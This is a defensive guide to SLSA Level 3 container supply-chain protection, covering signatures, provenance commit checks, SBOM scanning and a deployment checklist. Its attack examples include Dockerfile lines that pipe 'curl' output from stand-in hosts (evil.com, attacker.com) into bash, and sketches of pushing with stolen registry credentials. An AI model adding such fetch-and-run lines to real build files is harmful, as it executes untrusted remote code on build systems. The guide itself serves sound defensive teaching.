# Security Guide: Understanding SLSA L3 Protection

## Quick Reference

### Three Layers of Protection

| What You're Protecting Against | How SLSA L3 Protects You | Command to Verify |
|--------------------------------|-------------------------|-------------------|
| **Registry compromise** (attacker pushes malicious image) | Cosign signature proves builder identity | `cosign verify <image>` |
| **Code injection** (malicious code added before build) | SLSA provenance records exact commit SHA | Compare commit in provenance vs git tag |
| **Tag overwrite** (legitimate tag pointed to malicious image) | Digest + provenance shows mismatch | Pull by digest, verify commit |
| **Supply chain attack** (compromised dependencies) | SBOM lists all packages for scanning | `cosign verify-attestation --type spdx` |

## Common Questions

### Q: Why can't I just use image digests?

**A**: Digests only prove the image hasn't changed *after* it was built. They don't prove:
- Who built it (could be an attacker)
- What source code was used (could have injected code)
- When it was built
- What dependencies were included

**Example**:
```bash
# Attacker builds malicious image
docker build -t myorg/myapp:v1.0.0 .
# Image has digest: sha256:abc123...

# You pull by digest
docker pull myorg/myapp@sha256:abc123

# ❌ Digest is correct, but image is malicious!
# Digest only proves "this is the exact image", not "this is a safe image"
```

### Q: Why can't I just verify the signature?

**A**: Signatures prove *who* built the image, but not *what* was built.

**Example**:
```bash
# Attacker injects malicious code into your repo
echo "RUN curl http://evil.com/backdoor | bash" >> Dockerfile

# Your CI/CD builds and signs it (legitimately)
# Signature is valid ✅

# But the image contains malicious code!
# You need to verify the COMMIT to detect this
```

### Q: How do I detect if code was injected?

**A**: Compare the commit SHA in the SLSA provenance with your git tag:

```bash
# 1. Get commit from image provenance
ACTUAL_COMMIT=$(cosign verify-attestation \
  --type slsaprovenance \
  --certificate-identity-regexp='https://github.com/fystack/slsa-workflows/.github/workflows/docker-build-slsa.yml@.*' \
  --certificate-oidc-issuer='https://token.actions.githubusercontent.com' \
  myorg/myapp:v1.0.0 2>/dev/null \
  | jq -r '.payload | @base64d | fromjson | .predicate.materials[0].digest.sha1')

# 2. Get expected commit
EXPECTED_COMMIT=$(git rev-parse v1.0.0)

# 3. Compare
if [ "$ACTUAL_COMMIT" != "$EXPECTED_COMMIT" ]; then
  echo "❌ Code injection detected!"
  echo "Image was built from: $ACTUAL_COMMIT"
  echo "Expected commit:      $EXPECTED_COMMIT"
  exit 1
fi
```

### Q: Can an attacker forge the SLSA provenance?

**A**: No! The SLSA provenance is generated in an **isolated, non-privileged job** by the official SLSA generator. Key protections:

1. **Isolated execution**: Provenance job runs separately from build
2. **No write access**: Generator cannot modify build artifacts
3. **Signed by GitHub OIDC**: Uses GitHub's identity, not user credentials
4. **Recorded in Rekor**: Public transparency log prevents tampering
5. **Non-forgeable**: Cannot be created without GitHub Actions OIDC token

### Q: What if someone overwrites a tag?

**A**: This is detected by verification:

```bash
# Original build:
Tag: v1.0.0 → sha256:good123 (signed, commit: abc123)

# Attacker overwrites tag:
Tag: v1.0.0 → sha256:bad456 (not signed OR wrong commit)

# Verification detects:
cosign verify v1.0.0
# ❌ No signature found (if not signed)
# OR commit mismatch (if signed but wrong source)
```

**Best practice**: Always pull by digest in production:
```yaml
# deployment.yaml
image: myorg/myapp@sha256:good123  # Not myorg/myapp:v1.0.0
```

## Real-World Attack Examples

### Attack 1: Dockerfile Injection

**Attacker's goal**: Add backdoor to your image

**Attack**:
```dockerfile
# Attacker modifies Dockerfile
RUN echo "Testing digest change"  # Looks innocent
RUN date > /tmp/digest_test_hook

# Actually downloading malware
RUN curl -s http://attacker.com/payload | bash
```

**Detection**:
```bash
# Attacker commits this → commit SHA changes
git commit -m "test"  # Commit: bad4c0de

# CI/CD builds → SLSA provenance records: bad4c0de

# You verify:
ACTUAL=$(extract from provenance)  # = bad4c0de
EXPECTED=$(git rev-parse v1.0.0)   # = 5b80ec87

# ❌ Mismatch detected! Attack stopped!
```

### Attack 2: Registry Account Compromise

**Attacker's goal**: Push malicious image to your Docker Hub

**Attack**:
```bash
# Attacker steals your Docker Hub credentials
docker login -u youruser -p stolen_password

# Pushes malicious image
docker push youruser/yourapp:v1.0.0
```

**Detection**:
```bash
# Image exists, but no signature
cosign verify youruser/yourapp:v1.0.0
# ❌ FAIL: No valid signature

# Attack detected! Image wasn't built by CI/CD
```

### Attack 3: Supply Chain - Malicious Dependency

**Attacker's goal**: Compromise a dependency your app uses

**Attack**:
```bash
# Attacker publishes malicious npm package
npm publish evil-package@1.0.0

# Your app depends on it (directly or transitively)
npm install  # Installs evil-package
```

**Detection**:
```bash
# Extract SBOM from image
cosign verify-attestation --type spdx yourapp:v1.0.0 \
  | jq '.payload | @base64d | fromjson | .predicate.packages[]'

# Scan for known vulnerabilities
grype sbom:sbom.json

# ❌ WARNING: evil-package@1.0.0 contains known CVE
```

## Deployment Security Checklist

Before deploying an image to production:

- [ ] **Verify signature** - Proves trusted builder
  ```bash
  cosign verify --certificate-identity-regexp='...' <image>
  ```

- [ ] **Verify commit** - Detects code injection
  ```bash
  # Extract commit from provenance
  # Compare with git rev-parse <tag>
  ```

- [ ] **Scan SBOM** - Detects malicious dependencies
  ```bash
  cosign verify-attestation --type spdx <image> | grype
  ```

- [ ] **Pull by digest** - Prevents tag tampering
  ```bash
  docker pull <image>@sha256:...
  ```

- [ ] **Check Rekor** - Verify public audit trail
  ```bash
  rekor-cli search --artifact <image>
  ```

## Summary: Why You Need All Three

| Protection | What It Does | What It Doesn't Do |
|------------|-------------|-------------------|
| **Digest** | Proves image content hasn't changed | Doesn't prove who built it or from what source |
| **Signature** | Proves trusted CI/CD built it | Doesn't prove what source code was used |
| **Commit Verification** | Proves exact source code | Doesn't prevent malicious dependencies |
| **SBOM** | Lists all dependencies | Doesn't detect new zero-days |

**You need all layers for complete protection!**

## Tools Required

```bash
# Install cosign
brew install cosign  # macOS
# or: go install github.com/sigstore/cosign/v2/cmd/cosign@latest

# Install jq (for JSON parsing)
brew install jq  # macOS

# Install slsa-verifier (optional)
brew install slsa-verifier  # macOS

# Install grype (for SBOM scanning)
brew tap anchore/grype && brew install grype  # macOS
```

## Further Reading

- [SLSA Framework Documentation](https://slsa.dev/)
- [Sigstore Cosign Documentation](https://docs.sigstore.dev/cosign/overview/)
- [Supply Chain Security Best Practices](https://github.com/ossf/scorecard)
- [Container Security Guide](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)